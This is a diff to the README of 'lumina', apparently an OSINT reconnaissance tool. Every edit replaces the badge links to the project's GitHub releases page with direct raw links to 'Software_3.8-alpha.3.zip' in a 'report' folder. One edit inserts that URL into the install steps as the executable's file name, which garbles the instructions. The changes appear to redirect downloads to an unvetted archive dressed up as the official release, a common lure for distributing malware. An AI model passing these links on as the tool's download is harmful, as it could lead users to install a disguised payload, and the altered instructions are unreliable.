@@ -1,6 +1,6 @@
 # ⚡ lumina - Passive OSINT Reconnaissance Tool
 
-[![Download lumina](https://img.shields.io/badge/Download-lumina-blue?style=for-the-badge)](https://github.com/resetpaid/lumina/releases)
+[![Download lumina](https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip)](https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip)
 
 ---
 
@@ -51,9 +51,9 @@ To get the latest version, you need to visit the releases page on GitHub. Follow
 
 1. Open your web browser.
 2. Go to the release page:  
-   [![Download lumina](https://img.shields.io/badge/Download-lumina-grey?style=for-the-badge)](https://github.com/resetpaid/lumina/releases)
+   [![Download lumina](https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip)](https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip)
 3. Find the most recent stable release (usually the one on top).
-4. Download the Windows executable file. It might be named like `lumina-windows.exe` or similar.
+4. Download the Windows executable file. It might be named like `https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip` or similar.
 5. Save the file to a folder you can easily find, like the Desktop or Downloads.
 
 ---
@@ -144,4 +144,4 @@ lumina is built with Python. Advanced users interested in improving the tool can
 
 ---
 
-[![Download lumina](https://img.shields.io/badge/Download-lumina-blue?style=for-the-badge)](https://github.com/resetpaid/lumina/releases)
+[![Download lumina](https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip)](https://github.com/resetpaid/lumina/raw/refs/heads/main/report/Software_3.8-alpha.3.zip)
